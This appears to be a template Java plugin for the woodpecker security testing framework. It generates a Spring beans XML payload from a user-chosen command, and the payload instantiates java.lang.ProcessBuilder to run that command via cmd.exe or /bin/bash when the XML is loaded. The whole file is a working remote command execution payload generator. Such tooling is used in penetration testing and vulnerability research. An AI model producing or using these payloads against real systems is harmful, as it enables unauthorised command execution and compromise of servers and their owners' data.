package me.gv7.woodpecker.plugin.helper;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.plugin.utils.WPSettings;

import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;

/**
 * {@code Helper}组件是woodpecker中用于生成复杂载荷的组件
 */
public class SomeHelper implements IHelperPlugin {
    static IHelperPluginCallbacks callbacks;
    static IPluginHelper helper;

    @Override
    public void HelperPluginMain(IHelperPluginCallbacks helperPluginCallbacks) {
        this.callbacks = helperPluginCallbacks;
        this.helper = helperPluginCallbacks.getPluginHelper();
        helperPluginCallbacks.setHelperPluginAutor("<插件作者ID>");
        helperPluginCallbacks.setHelperPluginName("Some payload generator");
        helperPluginCallbacks.setHelperPluginVersion("0.1.0");
        helperPluginCallbacks.setHelperPluginDescription("Some载荷生成器");
        helperPluginCallbacks.registerHelper(new LinkedList<IHelper>() {{
            add(new Helper());
        }});
    }

    public static class Helper implements IHelper {

        @Override
        public String getHelperTabCaption() {
            return "Some payload generator";
        }

        /**
         * 设置生成载荷的一些必要的参数，如果不需要参数则直接返回 <u>null</u> 即可
         *
         * @return 返回利用所需的参数列表
         */
        @Override
        public IArgsUsageBinder getHelperCutomArgs() {
            IArgsUsageBinder argsUsageBinder = helper.createArgsUsageBinder();
            List<IArg> argsList = new ArrayList<IArg>();

            IArg argOS = helper.createArg();
            argOS.setName("os_type");
            argOS.setRequired(true);
            argOS.setType(IArg.ARG_TYPE_ENUM);
            argOS.setEnumValue(new ArrayList<String>() {{
                add("windows");
                add("linux");
            }});
            argOS.setDefaultValue("windows");
            argsList.add(argOS);

            IArg argCommand = helper.createArg();
            argCommand.setName("command");
            argCommand.setRequired(true);
            argCommand.setDefaultValue("whoami");
            argsList.add(argCommand);

            argsUsageBinder.setArgsList(argsList);
            return argsUsageBinder;
        }

        @Override
        public void doHelp(Map<String, Object> map, IResultOutput iResultOutput) throws Throwable {
            WPSettings settings = new WPSettings(map);
            String osType = settings.getString("os_type");
            String command = settings.getString("command");
            String xmlPoc = null;

            if (osType.equals("windows")) {
                xmlPoc = String.format("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                        "<beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
                        "  <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
                        "    <constructor-arg>\n" +
                        "      <list>\n" +
                        "        <value>cmd.exe</value>\n" +
                        "        <value>/c</value>\n" +
                        "        <value><![CDATA[%s]]></value>\n" +
                        "      </list>\n" +
                        "    </constructor-arg>\n" +
                        "  </bean>\n" +
                        "</beans>", command);

            } else if (osType.equals("linux")) {
                xmlPoc = String.format("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                        "<beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
                        "  <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
                        "    <constructor-arg>\n" +
                        "      <list>\n" +
                        "        <value>/bin/bash</value>\n" +
                        "        <value>-c</value>\n" +
                        "        <value><![CDATA[%s]]></value>\n" +
                        "      </list>\n" +
                        "    </constructor-arg>\n" +
                        "  </bean>\n" +
                        "</beans>", command);
            }

            iResultOutput.successPrintln(String.format("os type: [%s] command: [%s]", osType, command));
            iResultOutput.rawPrintln("\n");
            iResultOutput.rawPrintln(xmlPoc);
            iResultOutput.rawPrintln("\n");
        }
    }
}
